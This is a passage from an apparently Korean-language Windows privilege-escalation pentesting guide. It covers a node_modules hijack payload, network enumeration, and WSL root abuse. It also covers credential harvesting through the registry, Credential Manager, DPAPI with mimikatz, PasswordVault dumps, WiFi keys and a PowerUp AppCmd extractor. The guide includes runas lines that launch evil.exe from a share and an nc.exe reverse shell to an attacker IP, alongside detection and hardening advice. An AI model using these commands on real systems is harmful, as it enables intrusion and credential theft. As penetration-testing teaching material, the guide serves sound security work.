**권한이 낮은 사용자**가 `C:\node_modules`를 만들 수 있다면, 악성 `foo.js`(또는 패키지 폴더)를 심고 **더 높은 권한으로 실행되는 Node/Electron 프로세스**가 누락된 dependency를 찾을 때까지 기다릴 수 있습니다. 페이로드는 피해자 프로세스의 보안 컨텍스트에서 실행되므로, 대상이 관리자 권한으로 실행되거나, 권한이 상승된 scheduled task/service wrapper에서 실행되거나, 권한이 있는 데스크톱 앱이 자동 시작될 때 **LPE**가 발생합니다.

다음과 같은 경우에 특히 흔합니다.

- dependency가 `optionalDependencies`에 선언된 경우<sup>[[22]](#references)</sup>
- 서드파티 라이브러리가 `require("foo")`를 `try/catch`로 감싸고 실패 시에도 계속 실행하는 경우
- 패키지가 production 빌드에서 제거되었거나, 패키징 중 누락되었거나, 설치에 실패한 경우
- 취약한 `require()`가 메인 애플리케이션 코드가 아니라 dependency tree 깊숙한 곳에 있는 경우

### 취약한 대상 찾기

**Procmon**을 사용해 resolution path를 확인합니다.<sup>[[23]](#references)</sup>

- `Process Name` = 대상 실행 파일(`node.exe`, Electron 앱 EXE 또는 wrapper process)로 필터링
- `Path`에서 `node_modules`를 `contains`하는 항목으로 필터링
- `NAME NOT FOUND`와 `C:\node_modules`에서 마지막으로 성공한 open에 집중

압축 해제된 `.asar` 파일이나 애플리케이션 소스에서 유용한 code-review 패턴:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon 또는 소스 검토를 통해 **누락된 패키지 이름**을 식별합니다.
2. 아직 존재하지 않는 경우 루트 조회 디렉터리를 생성합니다:

```powershell
mkdir C:\node_modules
```

3. 예상된 정확한 이름의 module을 배치합니다:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 피해자 애플리케이션을 실행합니다. 애플리케이션이 `require("foo")`를 시도하고 정상 모듈이 없으면 Node가 `C:\node_modules\foo.js`를 로드할 수 있습니다.

이 패턴에 해당하는 실제 사례로는 `bluebird`와 `utf-8-validate` 같은 누락된 optional module이 있습니다. 하지만 재사용 가능한 부분은 **technique**입니다. 권한이 높은 Windows Node/Electron 프로세스가 resolve할 **missing bare import**를 찾으세요.

### 탐지 및 보안 강화 방안

- 사용자가 `C:\node_modules`를 만들거나 그곳에 새 `.js` 파일/패키지를 쓰면 경고합니다.
- `C:\node_modules\*`에서 읽는 high-integrity 프로세스를 탐지합니다.
- 프로덕션에 모든 runtime dependency를 패키징하고 `optionalDependencies` 사용을 감사 합니다.
- 타사 코드에 `try { require("...") } catch {}`와 같이 오류를 무시하는 패턴이 있는지 검토합니다.
- 라이브러리에서 지원하는 경우 optional probe를 비활성화합니다(예를 들어 일부 `ws` 배포에서는 `WS_NO_UTF_8_VALIDATE=1`로 legacy `utf-8-validate` probe를 피할 수 있습니다).

## 네트워크

### 공유 폴더

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts 파일에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인합니다.

```
type C:\Windows\System32\drivers\etc\hosts
```

### 네트워크 인터페이스 및 DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 열린 포트

외부에서 **제한된 서비스** 확인하기

```bash
netstat -ano #Opened ports?
```

로컬 리스너의 PID를 프로세스 소유자, 실행 파일 경로, 그리고 이를 시작하는 서비스나 예약된 작업과 대조하세요. 원격 제어 서비스는 인증 및 명령 제어 방식이 허용하는 경우에만 해당 데스크톱 사용자 권한으로 접근을 제공할 수 있습니다. 더 높은 권한의 계정으로 실행되는 사용자 지정 TCP 애플리케이션은 별도로 검토해야 합니다. 리스너와 바이너리 경로는 수동적인 단서일 뿐이며, 인증된 메모리 손상 경로를 확인하려면 해당 바이너리와 도달 가능한 입력을 분석해야 합니다. 노출된 포트가 시스템 프로세스에 속한 것으로 보인다면, 백엔드 서비스를 특정하기 전에 [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)의 결과와 비교하세요. 포워딩 규칙이 있다는 사실만으로는 대상에 도달할 수 있거나 취약하다는 점이 입증되지 않습니다.

### 라우팅 테이블

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP 테이블

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### 방화벽 규칙

[**방화벽 관련 명령은 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 나열, 규칙 생성, 끄기, 끄기...)**

[네트워크 열거 명령어는 여기에서 더 확인하세요](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다.

root 사용자를 얻으면 모든 포트에서 listen할 수 있습니다(`nc.exe`를 사용해 포트에서 처음 listen하면 방화벽에서 `nc`를 허용할지 GUI를 통해 묻습니다).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bash를 root로 쉽게 시작하려면 `--default-user root`를 사용해 보세요.

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 폴더에서 `WSL` 파일 시스템을 살펴볼 수 있습니다.

WSL 내의 Linux `root` 권한만으로 Windows 관리자 권한을 얻을 수 있는 것은 아닙니다. 현재 Windows 계정으로 배포판의 파일 시스템을 읽을 수 있다면 `/root/.bash_history`를 포함한 shell 기록 파일에서 자격 증명이 기록되었을 수 있는 명령을 확인하세요. 권한 상승을 위해서는 여전히 더 높은 권한의 유효한 계정과 허용된 인증 경로가 필요합니다. `LocalState\rootfs` 구조는 오래된 WSL 설치에 해당합니다. WSL 2에서는 배포판이 [`ext4.vhdx` 가상 디스크](https://learn.microsoft.com/en-us/windows/wsl/disk-space)에 저장되는 경우가 많으므로, 실제 배포판과 저장 경로를 먼저 확인하세요. 자동화된 열거 과정에서 기록 내용을 출력하지 마세요.

## Windows 자격 증명

### Winlogon 자격 증명

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName`과 `DefaultDomainName`은 자격 증명이 아닌 계정 컨텍스트로 취급하세요. 비어 있지 않은 `DefaultPassword` 또는 `AltDefaultPassword` 값은 레지스트리에 평문으로 저장된 항목입니다. `AutoAdminLogon=1`이지만 평문 암호를 읽을 수 없다면, 이는 단서일 뿐입니다. [Sysinternals Autologon은 암호를 LSA secret으로 저장할 수 있으며](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), 일반적인 레지스트리 읽기만으로는 해당 secret이 존재하는지 또는 가져올 수 있는지 확인할 수 없습니다. 자격 증명 노출을 보고하기 전에 액세스 권한과 실제 로그온 구성을 검토하세요.

### 자격 증명 관리자 / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>에서 인용:\
Windows Vault는 **Windows**가 **사용자를 자동으로 로그인하는 데** 사용할 수 있는 서버, 웹사이트 및 기타 프로그램의 사용자 자격 증명을 저장합니다. 처음에는 사용자가 Facebook, Twitter 또는 Gmail 같은 사이트의 자격 증명을 저장하면 브라우저가 자동으로 로그인할 수 있다는 뜻처럼 들릴 수 있지만, 실제로는 그렇지 않습니다.

Windows Vault는 Windows가 사용자를 자동으로 로그인하는 데 사용할 수 있는 자격 증명을 저장합니다. 즉, 리소스(서버 또는 웹사이트)에 액세스하기 위해 자격 증명이 필요한 **모든 Windows 애플리케이션은** 이 Credential Manager 및 Windows Vault를 **사용하여** 사용자가 매번 사용자 이름과 암호를 입력하는 대신 저장된 자격 증명을 이용할 수 있습니다.

애플리케이션이 Credential Manager와 상호작용하지 않는 한, 해당 애플리케이션에서 특정 리소스의 자격 증명을 사용할 수는 없다고 생각합니다. 따라서 애플리케이션이 vault를 사용하려면 Credential Manager와 **통신하여 기본 저장소 vault에서 해당 리소스의 자격 증명을 요청**해야 합니다.

`cmdkey`를 사용하여 컴퓨터에 저장된 자격 증명을 나열하세요.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

그런 다음 저장된 자격 증명을 사용하기 위해 `/savecred` 옵션과 함께 `runas`를 사용할 수 있습니다. 다음 예에서는 SMB 공유를 통해 원격 바이너리를 호출합니다.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

제공된 자격 증명을 사용하여 `runas` 실행하기.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), 또는 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)을 참고하세요.

### UWP PasswordVault / Credential Locker

최신 Windows UWP 애플리케이션, Microsoft Edge 및 최신 시스템 서비스는 인증 토큰과 plaintext passwords를 Universal Windows Platform (UWP) `PasswordVault`( `vaultcmd`에서 `Web Credentials`로도 표시됨)에 저장합니다. 이 저장 공간은 세션별로 격리되어 있으며, 관리자 권한이나 `SeDebugPrivilege` 권한 없이도 기본 기능을 사용해 복호화할 수 있습니다.

사용자의 활성 세션에서 다음 PowerShell 명령을 실행하면 저장된 모든 사용자 이름과 plaintext passwords를 즉시 덤프하고 복호화할 수 있습니다:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**는 데이터를 대칭 암호화하는 방법을 제공합니다. 주로 Windows 운영 체제에서 비대칭 개인 키를 대칭 암호화하는 데 사용됩니다. 이 암호화는 사용자 또는 시스템의 비밀 정보를 활용해 엔트로피를 크게 높입니다.

**DPAPI는 사용자의 로그인 비밀 정보에서 파생된 대칭 키를 통해 키를 암호화합니다**. 시스템 암호화의 경우 시스템의 도메인 인증 비밀 정보를 사용합니다.

DPAPI를 사용해 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장됩니다. 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 나타냅니다. **같은 파일에 있는 사용자의 개인 키를 보호하는 마스터 키와 함께 저장되는 DPAPI 키는** 일반적으로 64바이트의 임의 데이터로 구성됩니다. (이 디렉터리는 접근이 제한되어 있어 CMD에서 `dir` 명령으로 내용을 나열할 수 없지만, PowerShell에서는 나열할 수 있습니다.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

적절한 인수(`/pvk` 또는 `/rpc`)를 사용해 **mimikatz module** `dpapi::masterkey`로 이를 복호화할 수 있습니다.

**master password로 보호되는 자격 증명 파일**은 보통 다음 위치에 있습니다:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred`에 적절한 `/masterkey`를 지정해 복호화할 수 있습니다.\
(root 권한이 있다면) `sekurlsa::dpapi` module을 사용해 **memory**에서 여러 **DPAPI** **masterkeys**를 **추출**할 수 있습니다.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**는 편리하게 암호화된 credentials를 저장하는 방법으로 **scripting** 및 자동화 작업에 자주 사용됩니다. credentials는 **DPAPI**로 보호되므로 일반적으로 생성한 컴퓨터에서 생성한 사용자만 복호화할 수 있습니다.

내보낸 credential 파일은 임의의 파일 이름이나 `.xml` 경로를 가질 수 있습니다. 스크립트나 파일 목록에서 해당 파일을 찾으면 `C:\Users`에 있다고 가정하지 말고 계정의 실제 프로필 디렉터리를 확인하세요. [Windows에서는 프로필을 다른 위치에 저장할 수 있습니다](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). 파일을 읽을 수 있다는 사실은 단서일 뿐입니다. [Windows의 `Export-Clixml`은 암호화된 credential을 내보낸 사용자 및 컴퓨터에 연결합니다](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml). 또한 복구한 계정에는 대상 서비스에 대한 유효한 권한이 별도로 있어야 합니다. 일반적인 열거 작업 중에는 암호화된 값이나 평문 값을 출력하지 말고 먼저 경로와 ACL을 확인하세요.

파일에 들어 있는 PS credentials를 **복호화**하려면 다음을 실행하면 됩니다.

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### 와이파이

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 저장된 RDP 연결

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
및 `HKCU\Software\Microsoft\Terminal Server Client\Servers`에서 찾을 수 있습니다.

### 최근 실행한 명령

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **원격 데스크톱 자격 증명 관리자**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use **Mimikatz**의 `dpapi::rdg` 모듈과 적절한 `/masterkey`를 사용해 **모든 .rdg 파일을 복호화**합니다\
Mimikatz의 `sekurlsa::dpapi` 모듈을 사용하면 메모리에서 **많은 DPAPI masterkey를 추출**할 수 있습니다.

**mRemoteNG는 다른 연결 저장소를 사용합니다.** `%APPDATA%\mRemoteNG` 및 사용자의 Documents에서 읽을 수 있는 XML 파일을 확인하세요. `config.xml`처럼 흔한 이름의 파일도 포함됩니다. XML 파일을 credential 단서로 취급하기 전에 연결 스키마와 암호화된 `Password` 속성을 확인하세요. 저장된 값은 DPAPI/RDCMan 비밀번호가 아닙니다. 복구 가능 여부는 파일의 암호화 설정과 사용자 지정 master password 사용 여부에 따라 달라집니다. 광범위한 열거 중에는 암호화된 값을 출력하지 마세요.

**Remote Desktop Plus 프로필 내보내기 파일**도 사용자 디렉터리나 공유 관리 폴더에서 읽을 수 있는 경우가 있습니다. 레거시 `profiles.xml` 내보내기 파일에는 `ProfileName`, `Password`, `Secure` 요소가 포함된 `Data/Profile` 항목이 있습니다. 비어 있지 않은 password 요소는 credential 단서로 취급하되, 이를 출력하거나 평문이라고 가정하지 마세요. [벤더의 설명](https://www.donkz.nl/)에 따르면 프로필 보호는 생성 계정과 컴퓨터에 연결될 수 있으며, 더 느슨한 설정으로 구성할 수도 있습니다. 파일의 출처와 복구 조건을 확인한 뒤에만 이를 근거로 삼으세요.

### Sticky Notes

사람들은 때때로 sticky-note 애플리케이션에 비밀번호와 기타 정보를 저장합니다. Microsoft 패키지 Sticky Notes 앱은 보통 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 노트를 저장합니다. 이전 버전이나 다른 앱은 LevelDB를 비롯해 다른 사용자 프로필 저장소를 사용할 수 있습니다. SQLite 파일이 없다고 노트도 없다고 판단하기 전에 설치된 앱과 저장 형식을 확인하세요.

Sticky Notes가 SQLite write-ahead logging을 사용한다면 `plum.sqlite`만 복사할 경우 최근에 커밋된 노트가 누락될 수 있습니다. 일관된 데이터베이스 복사본과 함께 해당 `plum.sqlite-wal`을 보관하고, 사용 가능한 경우 `plum.sqlite-shm`도 포함하세요. shared-memory 인덱스는 다시 만들 수 있지만 WAL은 데이터베이스의 영구 상태에 포함됩니다. [SQLite의 WAL 문서](https://www.sqlite.org/wal.html)를 참조하세요. 계정 이름이나 비밀번호가 포함된 노트는 credential 단서일 뿐입니다. 계정, 허용된 접근 권한, 비밀번호 재사용 여부는 각각 별도로 확인하세요. 암호화된 password-manager 레코드만으로 더 높은 권한의 로그인을 입증하려면 실제 복호화 키와 애플리케이션별 해석이 추가로 필요합니다.

### AppCmd.exe

**AppCmd.exe에서 비밀번호를 복구하려면 Administrator 권한이 있어야 하며 High Integrity 수준으로 실행해야 합니다.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` 디렉터리에 있습니다.\
이 파일이 존재한다면 일부 **credential**이 구성되어 있고 **복구**할 수 있을 가능성이 있습니다.

이 코드는 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)에서 가져왔습니다:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 있는지 확인하세요 .\
설치 프로그램은 **SYSTEM 권한으로 실행되며**, 다수의 설치 프로그램이 **DLL Sideloading에 취약합니다 (정보 출처:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## 파일 및 레지스트리 (자격 증명)

### 지원 도구 레지스트리의 자격 증명 흔적

일부 구형 원격 지원 프로그램 설치본은 고정된 애플리케이션 레지스트리 키 아래에 비밀번호 관련 값 이름을 남깁니다. 예를 들어, [벤더의 레지스트리 키 설명](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)에 따르면 TeamViewer의 `SecurityPasswordAES`는 버전 9 이전에 설정된 정적 세션 비밀번호를 나타냈습니다. 값 이름 표시는 검토의 단서일 뿐입니다. 해당 자격 증명을 평가하기 전에 설치된 버전, 읽을 수 있는 값 데이터, 형식 및 현재 인증 동작을 확인하세요. 원격 지원 비밀번호에서 더 높은 권한을 가진 Windows 계정으로 이어지려면 실제 비밀번호 재사용이 확인되어야 하며, 해당 계정에 대한 권한도 있어야 합니다. 일상적인 열거 결과에 암호문이나 복구한 비밀번호를 출력하지 마세요.

### 보호된 시트가 있는 공유 스프레드시트

읽을 수 있는 공유 통합 문서에 계정 데이터가 있을 것으로 의심된다면 **파일 암호화**와 워크시트 보호 또는 숨겨진 열을 구분하세요. [Microsoft에 따르면](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) 워크시트 보호는 편집을 제어하는 기능이지 보안 기능이 아닙니다. 따라서 이것만으로 통합 문서의 내용이 암호화되었다고 볼 수 없습니다. 권한이 있고 관련성이 있는 파일만 검토하고, 광범위한 열거 과정에서 잠재적인 비밀 정보를 출력하지 마세요. 읽을 수 있는 `.xlsx` 경로, 보호된 시트 또는 숨겨진 열만으로는 자격 증명이 있거나 어떤 계정이 더 높은 권한을 가졌다고 입증되지 않습니다. 실제 데이터와 현재 계정 권한은 별도로 확인하세요.

### CI 서버에 남아 있는 변경 패치

CI 서버는 빌드가 끝난 후에도 제출된 소스 변경 사항을 데이터 디렉터리에 보관할 수 있습니다. [TeamCity 문서](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)는 `system/changes`를 원격 실행 변경 사항의 저장 위치로 설명합니다. 데이터 디렉터리는 설정할 수 있으므로 반드시 `ProgramData` 아래에 있는 것은 아닙니다. 읽을 수 있는 패치에는 제거되거나 추가된 자격 증명 파일, 암호화 키 또는 둘 다를 사용하는 스크립트에 대한 참조가 남아 있을 수 있습니다. 예를 들어 PowerShell의 `ConvertTo-SecureString -Key` 워크플로에는 AES 키와 암호화된 문자열이 모두 필요합니다. [Microsoft 문서](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)에 따르면 키는 별도로 제공됩니다. 먼저 접근 가능한 패치 이름만 확인한 다음, 권한이 있는 경우 관련 내용을 검토하되 일상적인 열거 결과에 비밀 정보를 출력하지 마세요. 패치 경로, 암호화된 값 또는 키 참조만으로 유효한 자격 증명이나 더 높은 권한의 접근이 입증되지는 않습니다. 데이터 디렉터리의 ACL을 제한하고 빌드 변경 사항에 비밀 정보를 커밋하지 마세요.

### 사용자 지정 로컬 관리자 비밀번호 순환

직접 만든 비밀번호 순환 도구는 암호화된 로컬 관리자 비밀번호를 로컬 서비스에 저장하면서, 데이터 저장소 자격 증명은 읽을 수 있는 `.env` 파일이나 업데이터 바이너리 옆에 둘 수 있습니다. 업데이터의 예약 작업, 계정, 구성 ACL, 리스너 및 데이터 저장소 권한을 함께 검토하세요. 루프백 전용 데이터 저장소라도 유효한 자격 증명이 있는 로컬 사용자는 접근할 수 있지만, 인증에 성공했다고 해서 관련 레코드를 읽을 권한이 입증되는 것은 아닙니다. 암호화 시드나 키 자료가 암호문 옆에서 접근 가능하다면, 암호화를 신뢰하기 전에 정확한 키 파생 방식을 검토하세요. 노출된 시드에서 Go의 [`math/rand`](https://pkg.go.dev/math/rand)를 사용해 AES 키를 결정론적으로 파생하는 방식은 해당 비밀번호를 보호하기에 적합하지 않습니다. Go는 이 패키지가 보안에 민감한 난수 생성에 부적합하다고 설명합니다. 복구한 비밀번호를 권한 상승 경로로 간주하기 전에 현재 유효하며 로컬 Administrators 그룹 계정의 비밀번호인지 확인하세요. 예약 작업, `.env` 경로 또는 암호화된 데이터 덩어리만으로는 이러한 조건이 입증되지 않습니다. 일상적인 열거 결과에 비밀번호나 키 자료를 출력하지 마세요.

관리형 로컬 관리자 비밀번호에는 [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview)를 사용하세요. 디렉터리 또는 Entra 기반 저장소와 접근 제어는 사용자 지정 로컬 데이터 저장소와는 다릅니다. 마찬가지로 [Elasticsearch 역할](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)은 인증된 데이터 저장소 사용자가 특정 인덱스를 읽을 수 있는지 결정합니다.

### Java 서버 플러그인 아카이브와 자격 증명 재사용

일부 Java 서버 플러그인은 서버의 `plugins` 디렉터리에 JAR 아카이브로 배포됩니다. 읽을 수 있는 사용자 지정 플러그인에는 임베디드 서비스 자격 증명이 포함된 구성이나 바이트코드가 있을 수 있습니다. 권한이 있을 때만 아카이브를 검토하고, 복구한 비밀 정보를 일상적인 열거 결과에 출력하지 마세요. 플러그인 경로만으로는 비밀 정보의 존재가 입증되지 않으며, 복구한 서비스 비밀번호가 더 높은 권한을 가진 계정에도 유효한 경우에만 더 높은 권한으로 이어질 수 있습니다. 관련 파일 ACL을 확인하고 재사용된 자격 증명을 서로 다른 비밀 정보로 교체하세요. 디렉터리 구조는 [PaperMC의 플러그인 설치 가이드](https://docs.papermc.io/paper/adding-plugins/)를, 아카이브 내용은 [Oracle의 JAR 문서](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)를 참조하세요.

### Openfire 임베디드 데이터베이스 자격 증명

임베디드 데이터베이스를 사용하는 Openfire 설치본은 `Openfire\embedded-db` 아래에 `openfire.script`를 보관할 수 있습니다. 현재 계정으로 이 파일을 읽을 수 있다면 `OFUSER` 레코드와 `passwordKey` 속성을 함께 검토하세요. Openfire의 [사용자 공급자 문서](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)에 따르면 비밀번호는 평문으로 저장되거나 해당 속성에 보관된 키로 암호화될 수 있습니다. 복구한 비밀번호는 더 높은 권한의 계정에 여전히 유효한 경우에만 권한 상승과 관련이 있습니다. 파일 이름만으로는 읽기 권한이나 자격 증명 재사용이 입증되지 않습니다. 이 경로는 인벤토리 확인의 단서일 뿐이므로, 데이터베이스 내용과 자격 증명을 일상적인 열거 결과에 출력하지 마세요.

별도의 `Openfire\conf\openfire.xml` 파일에는 외부 데이터베이스를 사용하는 경우에도 관리자 콘솔의 구성된 포트와 바인딩 인터페이스가 드러날 수 있습니다. Openfire는 관리자 콘솔을 일반적으로 루프백에 바인딩합니다. 그래도 리스너가 실행 중이라면 로컬 계정으로 해당 주소에 접근할 수 있습니다. 실제 리스너, 권한이 부여된 관리자 역할, 플러그인 업로드 정책 및 Openfire 서비스 ID를 함께 확인하세요. 플러그인을 설치할 수 있는 관리자는 서비스 컨텍스트에서 플러그인 코드를 실행시킬 수 있으며, 서비스가 LocalSystem으로 실행된다면 높은 권한을 가질 수 있습니다. 일치하는 계정 비밀번호나 읽을 수 있는 구성 경로만으로는 관리자 콘솔 접근이나 코드 실행이 입증되지 않습니다. 벤더의 [설치 및 플러그인 관리 가이드](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)와 [플러그인 업로드 API 속성](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)을 참조하세요.

### 포렌식 관리 서버 구성

